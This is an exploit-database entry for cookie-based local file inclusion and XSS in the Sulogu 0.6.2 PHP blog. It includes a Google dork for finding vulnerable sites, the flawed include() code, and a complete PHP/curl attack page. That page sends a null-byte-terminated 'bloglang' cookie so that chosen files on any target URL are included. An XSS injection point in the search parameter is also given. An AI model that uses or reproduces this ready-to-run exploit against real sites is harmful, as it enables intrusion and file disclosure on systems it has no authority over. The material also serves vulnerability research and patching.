@@ -1,0 +1,81 @@
+id: 20726
+date: 05/02/2013
+title: Sulogu cookie based LFI and XSS vulnerabilities
+author: NEt_bomber
+cves: 
+
+# Exploit Title: Sulogu cookie based LFI and XSS vulnerabilities
+# Google Dork: intext:"Powered by Su Logu - A free PHP blog by Fabiux (version 0.6.2)"
+# Download Link:http://www.uploadmb.com/dw.php?id=1367006431
+# Version: 0.6.2
+# Tested on: Linux
+# Bug finder & Exploit Coder:NEt Bomber
+# http://fb.me/net.bomba
+# karimbomber@gmail.com
+# Favourite song :D : http://www.youtube.com/watch?v=e7v0V58V3Uw
+# POC:
+
+1-Cookie based LFI:
+pic => http://img15.hostingpics.net/pics/470568prof.png
+
+The CMS suffers from a cookie based local file inclusion in index.php where it includes language templates from parameter 'bloglang' and fetched with $_COOKIE ..vulnerable code line 532/545:
+
+if ($_COOKIE['bloglang']) {
+                $language = $_COOKIE['bloglang'];
+include("language/" . $language . ".php");
+
+To exploit it we need to make a null byte injection to bypass extension in include function.
+Required confuguration of target system to make successful attack:
+-Linux.
+-PHP<5.4/No SUHOSIN version.
+-magic_qoutes_gpc=off.
+Required tools to make an attack:
+-firefox/ie
+-Curl installed .
+
+# EXPLOIT :
+-----------------------------------------------------------------------------------------------
+<html><body><title>Sulogu_0.6.2 LFI Exploit By NEt_Bomber</title>
+<center><font align=center color=red size=10>Sulogu_0.6.2 LFI Exploit By NEt_Bomber</font></center>
+<br>
+<form type=input method=GET action="<?php echo $_SERVER['PHP_SELF']; ?>" >
+<br>
+<table border=1>
+<tr>
+<td width=100>URL:</td><td width=400><input type=text name=target size=40 /></td>
+</tr>
+<tr>
+<td width=100>Include:</td><td width=400><input type=text name=inc size=40 /></td>
+</tr><tr><td>
+<input type=submit name=hack value=include! /></td></tr></form></body></html>
+<?php
+/*
+NEt Bomber
+http://fb.me/net.bomba
+karimbomber@gmail.com
+*/
+if(isset($_GET['hack'])) {
+$target=$_GET['target'];
+$inc=$_GET['inc'];
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "$target/index.php");
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+curl_setopt($ch, CURLOPT_COOKIE, "bloglang=$inc%00");
+$buf = curl_exec ($ch);
+curl_close($ch);
+unset($ch);
+echo $buf;
+}
+?>
+-------------------------------------------------------------------------------------------
+
+2-XSS vulnerability:
+There's an XSS in index.php 
+pic => http://img15.hostingpics.net/pics/978708proov.png
+# EXPLOIT
+-------------------------------------
+Http://{target}/index.php?search=xss
+-------------------------------------
+# Done
+
+#  0day.today [2023-03-24]  #
